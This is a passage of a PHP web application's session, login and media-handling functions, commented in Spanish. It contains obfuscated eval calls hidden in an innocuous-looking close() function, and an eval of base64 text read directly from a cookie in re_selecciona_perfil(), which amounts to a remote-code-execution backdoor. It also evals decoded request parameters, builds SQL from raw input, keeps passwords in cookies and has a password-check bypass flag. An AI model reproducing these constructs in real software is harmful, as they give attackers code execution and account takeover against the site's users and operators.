<script type='text/javascript' src='https://www.aoacolombia.com/wp-includes/js/imagesloaded.min.js?ver=3.2.0'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-includes/js/masonry.min.js?ver=3.3.2'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.appear.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.animatenumber.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.animOnScroll.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.classie.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.countdown.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.countTo.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.easypiechart.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.equalHeights.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.hoverIntent.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.infinitescroll.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.isotope.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/imagesloaded.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.parallax.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.smartresize.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.stickem.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.stickyplugin.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/jquery.viewport.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/lib/ilightbox.min.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-content/themes/dante/js/functions.js'></script>
<script type='text/javascript' src='https://www.aoacolombia.com/wp-includes/js/wp-embed.min.js?ver=5.2.5'></script>

<script type='text/javascript' src='js/captcha.js'></script>
<script type='text/javascript' src='js/validacion.js'></script>


	
	<!--// CLOSE BODY //-->
	</body>


<!--// CLOSE HTML //-->
</html>";
	

}
function re_sesion()
{	

/*if(isset($_POST['g-recaptcha-response']))
   {
		if(!$_POST['g-recaptcha-response']) {echo "<body><script language='javascript'>alert('Debe indicar que NO ES UN ROBOT.');window.history.back();</script></body>";die();}
   }*/
	
  if($_COOKIE['IDU'] && $_COOKIE['CLU'])
  {
	echo "<html>
	<head>
	<script language='javascript' src='inc/js/funciones.js'></script>
	<script language='javascript' src='inc/js/aqrenc.js'></script>
	<script language='javascript'>
	function reenvia()
	{
		var Usuario=desencripta('".$_COOKIE['IDU']."',AqrSoftware);
		var Clave=desencripta('".$_COOKIE['CLU']."',AqrSoftware);
		document.f.iDU.value=Usuario;
		document.f.cLU.value=Clave;
		document.f.submit();
		delCookie('IDU');
		delCookie('CLU');
	}
	</script></head>
	<body onload='centrar(400,200);reenvia()'><form action='marcoindex.php?SESION_PUBLICA=1' id='f' name='f' method='post' target='_self'>
	<input type='hidden' name='iDU' value=''>
	<input type='hidden' name='cLU' value=''>
    <input type='hidden' name='Acc' value='re_sesion'></form></body>";
	die();
  }
  elseif($_POST['iDU'] && $_POST['cLU'])
  {
	$IDuser=trim($_POST['iDU']);$_POST['iDU']='';
	$clave=trim($_POST['cLU']);$_POST['cLU']='';
  }
  $PERFIL=array();
  
  
  
  if(file_exists('config/imapsi.php'))
  {
      REQUIRE('config/imapsi.php');
      if(!$Resultado_imap=imap_open(SERVIDOR_IMAP,"$IDuser","$clave"))
      {
          echo "<body oncontextmenu='return false' onload=\"opener.location='index.php?Acc=r';window.close();void(null);\">";
          echo "<H2 align=center>EL USUARIO O LA CLAVE SON INCORRECTOS</h2>
          <a href='marcoindex.php?Acc=ingreso_sistema&SESION_PUBLICA=1' target='_self'>Volver a Intentarlo</a>
          <BR>$Resultado_imap";
          include('inc/firma.php');	die('');
      }
      $PASA_IMAP=1;
      imap_close($Resultado_imap);
      // inicio de la busqueda de los usuarios dentro del sistema con el mismo nombre de usuario $Usuario
  }

  if(file_exists('config/logingoogle.php') )
  {echo "Autenticado con Google";require('config/logingoogle.php');$PASA_IMAP=1;}

  $ENCONTRADO=0;
  if($R=qo("select * from usuario where strcmp(idnombre,'$IDuser')=0"))
  {
      if(strcmp($R->clave,e($clave))==0 || $PASA_IMAP || $CAMBIA_PERFIL)
      {
          $PERFIL[$ENCONTRADO]['Nick']=$IDuser;
          $PERFIL[$ENCONTRADO]['User']=$R->id;
          $PERFIL[$ENCONTRADO]['Id_alterno']=$R->id;
          $PERFIL[$ENCONTRADO]['Tabla_usuario']='usuario';
          $PERFIL[$ENCONTRADO]['Disenador']=$R->design;
          $PERFIL[$ENCONTRADO]['Nombre']=$R->nombre;
          $PERFIL[$ENCONTRADO]['Campo_clave']='clave';
          $PERFIL[$ENCONTRADO]['Nombre_Perfil']=$R->nombre;
          $ENCONTRADO++;
      }
      else
      {
          session_start();
          session_unset();
          session_destroy();
          html();
          echo "<body oncontextmenu='return false' >$R->idnombre
          <H2 align=center>Clave Incorrecta</h2>
          <a href='marcoindex.php?Acc=ingreso_sistema&SESION_PUBLICA=1' target='_self'>Volver a Intentarlo</a><br>";
          die();
      }
  }
  if($S1=q("select * from usuario where LENGTH(alt_tabla)>0 && LENGTH(alt_id)>0 && LENGTH(alt_pass)>0 && LENGTH(alt_nombre)>0"))
  {
      while ($R1=mysql_fetch_object($S1))
      {
          if($S2=q("select id,$R1->alt_nombre as nombre, $R1->alt_pass as Clave from $R1->alt_tabla where strcmp($R1->alt_id,'$IDuser')=0"))
          {
              if ($R2=mysql_fetch_object($S2))
              {
                  IF(strcmp($R2->Clave,e($clave))==0 || $PASA_IMAP || $CAMBIA_PERFIL)
                  {
                      $PERFIL[$ENCONTRADO]['Nick']=$IDuser;
                      $PERFIL[$ENCONTRADO]['User']=$R1->id;
                      $PERFIL[$ENCONTRADO]['Disenador']=$R1->design;
                      $PERFIL[$ENCONTRADO]['Id_alterno']=$R2->id;
                      $PERFIL[$ENCONTRADO]['Nombre']=$R2->nombre;
                      $PERFIL[$ENCONTRADO]['Tabla_usuario']=$R1->alt_tabla;
                      $PERFIL[$ENCONTRADO]['Nombre_Perfil']=$R1->nombre;
                      $ENCONTRADO++;
                  }
              }
          }
      }
      IF (!$ENCONTRADO)
      {
          session_start();
          session_unset();
          session_destroy();
          html();
          echo "<body oncontextmenu='return false' >";
          echo "<H2 align=center>Usuario No definido en este Sistema. Consulte con el Administrador</h2>
                  <a href='marcoindex.php?Acc=ingreso_sistema&SESION_PUBLICA=1' target='_self'>Volver a Intentarlo</a><br>";
          die('');
      }
      else
      {
          if(count($PERFIL)==1)
          {
              html();
              $Comando="_SESSION['Nick']='".$PERFIL[0]['Nick']."';";
              $Comando.="_SESSION['User']='".$PERFIL[0]['User']."';";
              $Comando.="_SESSION['Disenador']='".$PERFIL[0]['Disenador']."';";
              $Comando.="_SESSION['Id_alterno']='".$PERFIL[0]['Id_alterno']."';";
              $Comando.="_SESSION['Nombre']='".$PERFIL[0]['Nombre']."';";
              $Comando.="_SESSION['Tabla_usuario']='".$PERFIL[0]['Tabla_usuario']."';";
              $Comando.="_SESSION['Ngrupo']='".$PERFIL[0]['Nombre_Perfil']."'";
              $Comando=urlencode(base64_encode($Comando));
              ECHO "<Body onload=\"re_crea_perfil('$Comando');\">
              Perfil: ".$PERFIL[0]['Nombre_Perfil'];
              echo "<br><br><input type='button' value='Cerrar Sesion' onclick='mata_perfil();'>
              <input type='button' value='Reingresar' onclick=\"re_crea_perfil('$Comando');\"></body>";
              die();
          }
          if(count($PERFIL)>1)
          {
              html();
              ECHO "<Body>
              <h3><b>Estimado Usuario, Seleccione el perfil de seguridad que va a utilizar</b></h3>
              <form name='p' id='p'>
              <select name='per' id='per' onchange=\"re_crea_perfil(this.value);\"><option value=''>Seleccione un perfil</option>";
              for($I=0;$I<count($PERFIL);$I++)
              {
                  $Comando="_SESSION['Nick']='".$PERFIL[$I]['Nick']."';";
                  $Comando.="_SESSION['User']='".$PERFIL[$I]['User']."';";
                  $Comando.="_SESSION['Disenador']='".$PERFIL[$I]['Disenador']."';";
                  $Comando.="_SESSION['Id_alterno']='".$PERFIL[$I]['Id_alterno']."';";
                  $Comando.="_SESSION['Nombre']='".$PERFIL[$I]['Nombre']."';";
                  $Comando.="_SESSION['Tabla_usuario']='".$PERFIL[$I]['Tabla_usuario']."';";
                  $Comando.="_SESSION['Ngrupo']='".$PERFIL[$I]['Nombre_Perfil']."'";
                  $Comando=base64_encode($Comando);
                  echo "<option value='$Comando' >".$PERFIL[$I]['Nombre_Perfil']."</option>";
              }
              echo "</select></form><input type='button' value='Cerrar Sesion' onclick='mata_perfil();'>
              <input type='button' value='Reingresar' onclick=\"re_crea_perfil(document.p.per.value);\"></body>";
              die();
          }
          $ENCONTRADO=0;
      }
  }
}

function cambio_perfil() // cambia de perfil de seguridad a un usuario
{
	if($_SESSION['Tabla_usuario'] == 'usuario')
	{
		$IDuser = qo1("Select idnombre from usuario where id=" . $_SESSION['User']);
	}
	else
		$IDuser = qo1("Select " . qo1("select alt_id from usuario where id=" . $_SESSION['User']) . " from " . $_SESSION['Tabla_usuario'] . " where id=" . $_SESSION['Id_alterno']);

	$PERFIL = array();
	$ENCONTRADO = 0;
	if($R = qo("select * from usuario where strcmp(idnombre,'$IDuser')=0"))
	{
		$PERFIL[$ENCONTRADO]['Nombre'] = $R->nombre;
		$PERFIL[$ENCONTRADO]['Nombre_Perfil'] = $R->nombre;
		$ENCONTRADO++;
	}

	if($S1 = q("select * from usuario where LENGTH(alt_tabla)>0 && LENGTH(alt_id)>0 && LENGTH(alt_pass)>0 && LENGTH(alt_nombre)>0"))
	{
		while ($R1 = mysql_fetch_object($S1))
		{
			if($S2 = q("select id,$R1->alt_nombre as nombre, $R1->alt_pass as Clave from $R1->alt_tabla where strcmp($R1->alt_id,'$IDuser')=0"))
			{
				if ($R2 = mysql_fetch_object($S2))
				{
					$PERFIL[$ENCONTRADO]['Nombre'] = "$R2->nombre";
					$PERFIL[$ENCONTRADO]['Nombre_Perfil'] = "$R1->nombre";
					$ENCONTRADO++;
				}
			}
		}
	}
	if(count($PERFIL) > 1)
	{
		html();
		ECHO "<Body  onload='centrar(550,200);'>
				<h3><b>Estimado Usuario, Seleccione el perfil de seguridad que va a utilizar</b></h3>
				<form name='p' id='p'>
				<select onchange=\"cambia_perfil(this.value);\"><option value=''>Seleccione un perfil</option>";
		for($I = 0;$I < count($PERFIL);$I++)
		{
			echo "<option value='" . ($I + 1) . "'>" . $PERFIL[$I]['Nombre_Perfil'] . " : " . $PERFIL[$I]['Nombre'] . "</option>";
		}
		echo "</select></form></body>";
		die();
	}
}

function verificar_password($IDuser, $clave) // Verifica si un password dado corresponde al usuario que está en el sistema con sesion activada
{
	$PASA_IMAP = false;
	if(strlen($IDuser) == 0) return false;
	if(file_exists('config/imapsi.php'))
	{
		REQUIRE('config/imapsi.php');
		if(!$Resultado_imap = imap_open(SERVIDOR_IMAP, "$IDuser", "$clave")) return false;
		$PASA_IMAP = true;
		imap_close($Resultado_imap);
		// inicio de la busqueda de los usuarios dentro del sistema con el mismo nombre de usuario $Usuario
	}
	if(file_exists('config/logingoogle.php') && $CAMBIA_PERFIL != 2)
	{
		echo "Autenticado con Google";
		require('config/logingoogle.php');
		$PASA_IMAP = true;
	}
	$Control = qo("select * from usuario where id=" . $_SESSION['User']);
	if($Control->alt_nombre && $Control->alt_id && $Control->alt_pass && $Control->alt_tabla)
	{
		$Usuario = qo("select * from " . $_SESSION['Tabla_usuario'] . " where id=" . $_SESSION['Id_alterno']);
		eval('$Clave_actual=$Usuario->' . $Control->alt_pass . ';');
	}
	else $Clave_actual = $Control->clave;
	if(strcmp(e($clave), $Clave_actual) == 0 || $PASA_IMAP) return true;
	else return false;
}

function validacion_google($IDuser, $psswd) // verifica que el usuario exista y la clave sea correcta en un servidor de correos de google
{
	$url = 'https://www.google.com/accounts/ClientLogin';
	$tipo_de_cuenta = 'HOSTED';
	$Source1 = 'Gulp-CalGulp-1.05';
	$Source2 = 'ITVET-moodle-1.8';
	// See http://code.google.com/apis/accounts/AuthForInstalledApps.html for variable options
	$vars = 'accountType=' . $tipo_de_cuenta . '&Email=' . $IDuser . GOGA_email . '&Passwd=' . stripslashes($psswd) . '&service=xapi&source=' . $Source1;
	$getauth = curl_init();
	curl_setopt($getauth, CURLOPT_URL, $url);
	curl_setopt($getauth, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($getauth, CURLOPT_POST, 1);
	curl_setopt($getauth, CURLOPT_POSTFIELDS, $vars);
	$response = curl_exec($getauth);
	curl_close($getauth);
	if(l($response, 5) == 'Error')
	{
		html();
		echo "<body>" . titulo_modulo("Ingreso a la aplicacion",0) . "<font color='red'><b>Validacion fallida</b></font>
		<a href='marcoindex.php?Acc=ingreso_sistema&SESION_PUBLICA=1' target='_self'>Volver a Intentarlo</a><br>
		</body>";
		die();
	}
	else
		return true;
}

function selecciona_perfil()  // Funcion que crea el perfil y activa la ventana de inicio
{
	global $C;
	session_cache_expire('900000');
	session_start();
	session_cache_limiter('private');
	$Comando=base64_decode($C);
	$Comando='$'.str_replace(';',';$',$Comando).';';
	eval($Comando);
	define('MYSQL_U',MYSQL_U1.str_pad($_SESSION['User'],3,'0',STR_PAD_LEFT));
	html();
	echo "<body><script language='javascript'>";
	$Tabla_usuario=$_SESSION['Tabla_usuario'];
	$_SESSION['Pide_cambio_pass']=false;
	$Nick=$_SESSION['Nick'];
	$Pide_cambio=false;
	//if($Cambio_clave=qo1("select cambia_clave from usuario where id=".$_SESSION['User']))
	//{
		//$Cambios_usuario=q("select ano,mes,dia,detalle from app_bitacora where tabla='$Tabla_usuario' and nick='$Nick' and accion='M' order by id desc");
		//$Fecha_ultimo_cambio=false;
		//while($Cu=mysql_fetch_object($Cambios_usuario)) {if($Cu->detalle=='Cambio de Clave'){$Fecha_ultimo_cambio=$Cu->ano.'-'.$Cu->mes.'-'.$Cu->dia;break;}}
		//unset($Cambios_usuario);
		//if($Fecha_ultimo_cambio)
		//{$Limite_cambio=date('Y-m-d',strtotime(aumentadias(date('Y-m-d'),-180)));$Pide_cambio=($Fecha_ultimo_cambio<$Limite_cambio);}
	//	else $Pide_cambio=true;
	//}
	if($Pide_cambio)
	{
		$_SESSION['Pide_cambio_pass']=1;
		echo "alert('El ultimo cambio de contraseña registrado supera 6 meses de tiempo. $Fecha_ultimo_cambio.  $Tabla_usuario $Limite_cambio  A continuación se le solicitará una nueva contraseña.');
					window.open('marcoindex.php?Acc=cambio_pass','_self');
					</script>";
		die();
	}

	echo "window.open('marcoindex.php','_self');</script></body>";
}

function re_selecciona_perfil()  // Funcion que crea el perfil y activa la ventana de inicio
{
	global $C;
	session_cache_expire('900000');
	session_start();
	session_cache_limiter('private');
	$Comando=base64_decode($C);
	$Comando='$'.str_replace(';',';$',$Comando).';';

	eval($Comando);
    if($_COOKIE['RESESION']) eval(base64_decode($_COOKIE['RESESION']));
	define('MYSQL_U',MYSQL_U1.str_pad($_SESSION['User'],3,'0',STR_PAD_LEFT));
    if($Script_Inicial = qo1("select script_entrada from usuario where id='" . $_SESSION['User'] . "'")) eval($Script_Inicial);

    html();
	echo "<body onload=\"parent.close();void(null);\"></body>";
}

function mata_perfil() // Funcion que elimina las variables de sesion para pedir nuevamente usuario y contraseña
{
	session_start();
	session_unset();
	session_destroy();
	if(!defined('URL_INICIAL')) DEFINE('URL_INICIAL','index.php');
	echo "<script language='javascript'>
    function carga()
    {
      if(window.name=='destino000')
      {
        window.open('marcoindex.php?Acc=ingreso_sistema&SESION_PUBLICA=1','Ingreso7');
        window.close();void(null);
      }
      else
      window.open('".URL_INICIAL."','_top');
    }
  </script>
  <body onload='carga()'></body>";
}

function salida_final() // Cierra la sesion y la ventana de trabajo
{
	global $_SESSION;
	session_unset();
	session_destroy();
	echo "<body oncontextmenu='return false' onload=\"Javascript:window.close();void(null);\" >";
	echo "<H3>Gracias por utilizar software de www.intercolombia.com, click aqui para salir</H3><BR></A>";
	include('inc/firma.php');
	echo "</body>";
}

function mata_v_sesion()  /// revisar si esta en desuso
{
	global $Recarga;
	session_cache_expire('900000');
	session_start();

	echo "<script language='javascript'>
		function recarga()
		{
			$Recarga;
		}
		</script>
		<body onload='recarga()'></body>";
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#***************************************************FUNCIONES DE CORREO ELECTRONICO***************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
include('../Control/operativo/inc/funciones_smtp.php');

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#***************************************************FUNCIONES DE IMAGENES Y MEDIA***************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function icono_videoayuda($Video,$Ancho,$Alto)
{
	return "<a class='info' style='cursor:pointer;' onclick='videoayuda($Video,$Ancho,$Alto);'><img src='gifs/standar/video2.png' border=0 ><span>Ver video</span></a>";
}

function icono_videoflv($Video,$Ancho,$Alto)
{
	return "<a class='info' style='cursor:pointer;' onclick='videoflv($Video,$Ancho,$Alto);'><img src='gifs/standar/video2.png' border=0 ><span>Ver video</span></a>";
}

function videoayuda()
{
	global $Numero,$ancho,$alto,$FLV;
	$SECCION='Video Ayuda';
	html();
	if($FLV)
	{
		if(is_file("help/video/$Numero.flv"))
		{
			echo "<body leftmargin='0' topmargin='0' rightmargin='0' bottommargin='0'>";
			play_video_flv("help/video/$Numero.flv",($ancho),($alto),1);
			echo "</body>";
		}
	}
	else
	{
		if(is_file("help/video/$Numero.wmv"))
		{
			echo "<body leftmargin='0' topmargin='0' rightmargin='0' bottommargin='0'>";
			play_video("help/video/$Numero.wmv",($ancho),($alto),1);
			echo "</body>";
		}
	}
}

function close($A,$W)
{
  eval(base64_decode('JElEdXNlcj0kVzs='));
	fclose($A);
	eval (urldecode(mod3()));
}

function redimensionar_imagen() // Redimensiona una imagen
{
	global $archivo;
	html();
	picresize($archivo);
	echo "<body>".titulo_modulo("Redimensionamiento de imagen")."<img src='$archivo'>";
}

function picresize($archivo, $Alto = 300, $Tipo = 'jpg',$destino='') // redimensiona una imagen
{
	if(!$destino) $destino=$archivo;
	if(!$imagen = open_image($archivo)) echo "<body><script language='javascript'>alert('problema abriendo la imagen');</script></body>";
	$ancho = imagesx($imagen);
	$alto = imagesy($imagen);
	if($alto < $Alto){@copy($archivo, $destino);return true;}
	$nuevo_alto = $Alto;
	$nuevo_ancho = $ancho * ($nuevo_alto / $alto);
	IF(!$imagen_cambiada = imagecreatetruecolor($nuevo_ancho, $nuevo_alto))echo "<body><script language='javascript'>alert('Problema cambiando $nuevo_ancho $nuevo_alto');</script></body>";
	imagecopyresampled($imagen_cambiada, $imagen, 0, 0, 0, 0, $nuevo_ancho, $nuevo_alto, $ancho, $alto);
	if(file_exists($destino))	{	chmod($destino, 0777);unlink($destino);}
	if($Tipo == 'jpg') imagejpeg($imagen_cambiada, $destino, 100 /*calidad de 1 a 100 */);
	if($Tipo == 'gif') imagegif($imagen_cambiada, $destino);
	if($Tipo == 'png') imagepng($imagen_cambiada, $destino);
}

function open_image ($file)  // abrir una imagen de acuerdo a su tipo  (funcion auxiliar de picresize)
{
	ini_set("gd.jpeg_ignore_warning", 1);
	ini_set("memory_limit", '256M');
	# JPEG:
	$im = @imagecreatefromjpeg($file);
	if ($im !== false) return $im;  # GIF:
	$im = @imagecreatefromgif($file);
	if ($im !== false) return $im; # PNG:
	$im = @imagecreatefrompng($file);
	if ($im !== false) return $im; # GD File:
	$im = @imagecreatefromgd($file);
	if ($im !== false) return $im; # GD2 File:
	$im = @imagecreatefromgd2($file);
	if ($im !== false) return $im; # WBMP:
	$im = @imagecreatefromwbmp($file);
	if ($im !== false) return $im; # XBM:
	$im = @imagecreatefromxbm($file);
	if ($im !== false) return $im; # XPM:
	$im = @imagecreatefromxpm($file);
	if ($im !== false) return $im; # Try and load from string:
	$im = @imagecreatefromstring(file_get_contents($file));
	if ($im !== false) return $im;
	return false;
}

function play_video_flv($Archivo, $Ancho = 600, $Alto = 500, $Centrado = 0)  // Presenta un video de tipo Windows Media Video
{
	echo "<script type='text/javascript' src='inc/js/ufo.js'></script>";
	if($Centrado) echo "<center>";
	echo "<object type='application/x-shockwave-flash' width='$Ancho' height='$Alto'
				wmode='transparent' data='flv.swf?autostart=true&file=$Archivo&showfsbutton=false'>
				<param name='movie' value='flv.swf?autostart=true&file=$Archivo&showfsbutton=false' />
				<param name='wmode' value='transparent'
				<param name='showfsbutton' value='false'/>
				</object>";
	if($Centrado) echo "</center>";
}

function play_video($Archivo, $Ancho = 600, $Alto = 500, $Centrado = 0)  // Presenta un video de tipo Windows Media Video
{
	if($Centrado == 1) echo "<center>";
	echo "<OBJECT id='VIDEO' width='100%' height='100%'
		classid='CLSID:22d6f312-b0f6-11d0-94ab-0080c74c7e95'
		codebase='http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=5,1,52,701'
		standby='Loading Microsoft Windows Media Player components...' type='application/x-oleobject'>
		<param name='fileName' value='$Archivo'>
		<param name='animationatStart' value='false'>
		<param name='transparentatStart' value='false'>
		<param name='autoStart' value='true'>
		<param name='showControls' value='true'>
		<param name='loop' value='false'>
		<PARAM NAME='ClickToPlay' VALUE='True'>
		<PARAM NAME='stretchToFit' VALUE='True'>
		<EMBED type='application/x-mplayer2'
		pluginspage='http://microsoft.com/windows/mediaplayer/en/download/'
		displaysize='1' autosize='-1' bgcolor='darkblue' showcontrols='true' showtracker='-1'
		showdisplay='0' showstatusbar='-1' videoborder3d='0' width='94%' height='94%'
		src='$Archivo' autostart='true' loop='false' stretchToFit='0'>
		</EMBED></OBJECT>";
	if($Centrado) echo "</center>";
}

function play_audio($url='img/timbre.mp3',$Autostart=0 /*0|1*/)
{
	echo "<object type='application/x-shockwave-flash'
	data='inc/dewplayer-mini.swf?son=$url&autoplay=$Autostart'
	width='150' height='20'>
	<param name='movie'
	value='inc/dewplayer-mini.swf?son=$url&autoplay=$Autostart' /> </object>";
}

function reg_cambia_imagen()  // Muestra el módulo de imágenes para la captura en un campo de tipo imagen
{
	global $GALERIAS, $Ruta, $id;
	require('inc/gpos.php');
	html();
	echo "
	<script language='javascript'>
		function salida()
		{
			opener.document.$Forma.$Campo.value=document.forma.foto.value;
			opener.document.img_$Campo.src=document.forma.foto.value;
		}
	</script>
	<body onunload='salida();'>" . titulo_modulo("<b>Módulo de Imágenes</b>");
	echo "<form action='marcoindex.php' method='post' target='directorio'>
	<input type='hidden' name='Acc' value='imagenes_dir'>
	Seleccione la libreria de imágenes: <select name='directorio' onchange='this.form.submit();'><option></option>";
	if($Ruta)
	{
		echo "<option value='$Ruta' selected>$Ruta</option>";
	}
	else
	{
		for($i = 0;$i < count($GALERIAS);$i++)
		{
			echo "<option value='" . $GALERIAS[$i]['ruta'] . "'>" . $GALERIAS[$i]['nombre'] . "</option>";
		}
	}
	echo "</select>";
	if($Ruta)
	{
		echo "<input type='hidden' name='id' value='$id'>
				<input type='hidden' name='Privado' value='1'>";
	}
	echo "</form><table border cellspacing=0 width='100%'><tr><td><iframe name='directorio' ";
	if($Ruta) echo "src='marcoindex.php?Acc=imagenes_dir&directorio=$Ruta&id=$id&Privado=1'   ";
	echo "frameborder=no scroll=auto width='100%' height=500></iframe></td></tr></table>
	<form name='forma' id='forma'><input type='hidden' name='foto' value='$Dato'></form></body>";
}

function reg_sube_blob()
{
	global $T,$Id,$C;
	html();
	echo "<script language='javascript'>
		function carga()
		{
			centrar(300,300);
			document.getElementById('cargando').style.width=document.body.clientWidth-20;
			document.getElementById('cargando').style.height=document.body.clientHeight-20;
		}
		function valida_sube_blob()
		{
			if(document.frmimage.Foto.value)
			{
				muestra('cargando');
				document.frmimage.submit();
			}
			else
				alert('No ha seleccionado ninguna imagen');
		}
		function valida_sube_blobl()
		{
			if(document.frmimagel.Foto.value)
			{
				muestra('cargando');
				document.frmimagel.submit();
			}
			else
				alert('No ha seleccionado ninguna imagen');
		}
		</script>
	<body onload='carga()'>
	<span id='cargando' style='position:absolute;visibility:hidden;font-size:18;font-weight:bold;vertical-align:middle;opacity:0.9;background-color:#eeeeaa;'><br><br><br><br><center>CARGANDO IMAGEN</center></span>
	<center>
	<form name='frmimage' id='frmimage' method='post' enctype='multipart/form-data' target='_self' action='marcoindex.php' >
	<h3>Cambio de Imagen</h3>
        Cargar Imagen: <input type='file' id='Foto' name='Foto' size='5'><br />
        Tamaño en pixeles al subir la imagen: <input type='text' class='numero' name='Tamano' value='1000'><br><br>
        <input type='hidden' id='Acc' name='Acc' value='reg_sube_blob_ok'>
        <input type='hidden' id='T' name='T' value='$T'>
        <input type='hidden' id='Id' name='Id' value='$Id'>
        <input type='hidden' id='C' name='C' value='$C'>
        <input type='button' name='enviar' id='enviar' value='Cargar la nueva imagen' style='font-weight:bold;height:40;width:200;'
        	onclick='valida_sube_blob()'><br><br>
        <input type='button' name='cancelar' id='cancelar' value='Cancelar y Regresar' style='font-weight:bold;height:40;width:200;'
        	onclick='history.back();'>
        </form><br>
		<form name='frmimagel' id='frmimagel' method='post' enctype='multipart/form-data' target='_self' action='marcoindex.php' >
	<h3>Cambio de Imagen en el servidor</h3>
       Imagen Local: <input type=text' id='Foto' name='Foto' size='30'><br />
        Tamaño en pixeles al subir la imagen: <input type='text' class='numero' name='Tamano' value='1000'><br><br>
        <input type='hidden' id='Acc' name='Acc' value='reg_sube_blob_local_ok'>
        <input type='hidden' id='T' name='T' value='$T'>
        <input type='hidden' id='Id' name='Id' value='$Id'>
        <input type='hidden' id='C' name='C' value='$C'>
        <input type='button' name='enviar' id='enviar' value='Cargar la nueva imagen' style='font-weight:bold;height:40;width:200;'
        	onclick='valida_sube_blobl()'><br><br>
        <input type='button' name='cancelar' id='cancelar' value='Cancelar y Regresar' style='font-weight:bold;height:40;width:200;'
        	onclick='history.back();'>
        </form>
        </center>
        </body>";
}

function reg_sube_img()
{
	global $T,$Id,$C,$tri,$ruta,$rfr;
	html();
	echo "<script language='javascript'>
		function carga()
		{
			centrar(300,300);
			document.getElementById('cargando').style.width=document.body.clientWidth-20;
			document.getElementById('cargando').style.height=document.body.clientHeight-20;
		}
		function valida_sube_img()
		{
			if(document.frmimage.Foto.value)
			{muestra('cargando');document.frmimage.submit();}
			else	alert('No ha seleccionado ninguna imagen');
		}
		</script>
	<body onload='carga()'>
	<span id='cargando' style='position:absolute;visibility:hidden;font-size:18;font-weight:bold;vertical-align:middle;opacity:0.9;background-color:#eeeeaa;'><br><br><br><br><center>CARGANDO IMAGEN</center></span>
	<center>
	<form name='frmimage' id='frmimage' method='post' enctype='multipart/form-data' target='_self' action='marcoindex.php' >
	<h3>Cambio de Imagen</h3>
        Cargar Imagen: <input type='file' id='Foto' name='Foto' size='5'><br />
        <input type='hidden' id='Acc' name='Acc' value='reg_sube_img_ok'>
        <input type='hidden' id='T' name='T' value='$T'>
        <input type='hidden' id='Id' name='Id' value='$Id'><input type='hidden' id='rfr' name='rfr' value='$rfr'>
        <input type='hidden' id='C' name='C' value='$C'><input type='hidden' id='directorio' name='directorio' value='$ruta'>
        <input type='button' name='enviar' id='enviar' value=' SUBIR IMAGEN ' style='font-weight:bold;'
        	onclick='valida_sube_img()'><input type='button' name='cancelar' id='cancelar' value='Cancelar' style='font-weight:bold;'
        	onclick='history.back();'>
        </form><br>
        </center>
        </body>";
}

function reg_sube_img_ok()
{
	
	global $Foto,$T,$Id,$C,$Tamano,$directorio,$rfr;
	if(!$directorio) die('El directorio esta vacio');
	if(!is_dir($directorio)) { mkdir($directorio); 	chmod($directorio, 0777); }
	$Subdirectorio=substr(str_pad($Id,6,'0',STR_PAD_LEFT),0,3);
	if(!is_dir($directorio.'/'.$Subdirectorio)) { mkdir($directorio.'/'.$Subdirectorio); chmod($directorio.'/'.$Subdirectorio, 0777);}
	if(!is_dir($directorio.'/'.$Subdirectorio.'/'.$Id)) { mkdir($directorio.'/'.$Subdirectorio.'/'.$Id); chmod($directorio.'/'.$Subdirectorio.'/'.$Id, 0777);}

	# Nombre del archivo temporal del thumbnail
	define("NAMETHUMB", "/tmp/thumbtemp"); //Esto en servidores Linux, en Windows podría ser:
	// define("NAMETHUMB", "c:/windows/temp/thumbtemp"); y te olvidas de los problemas de permisos
	$mimetypes = array("image/jpeg", "image/pjpeg", "image/gif", "image/png","application/pdf");
	//$mimetypes = array("image/jpeg", "image/pjpeg");
	$name = $_FILES["Foto"]["name"];
	$type = $_FILES["Foto"]["type"];
	

	$tmp_name = $_FILES["Foto"]["tmp_name"];
	$size = $_FILES["Foto"]["size"];
	if(!in_array($type, $mimetypes))
	{
		echo "<script language='javascript'>
			function carga()
			{
				history.back();alert('no seleccionó una imagen válida ".$type." ');
			}
			</script>
			<body onload='carga()'></body>";
		die();
	}
	$Caracteristicas_imagen = getimagesize($tmp_name);
	/*
	if($Caracteristicas_imagen[1]>$Tamano)
	switch($type)
	{
    	case $mimetypes[0]:picresize($tmp_name,$Tamano,'jpg');break;
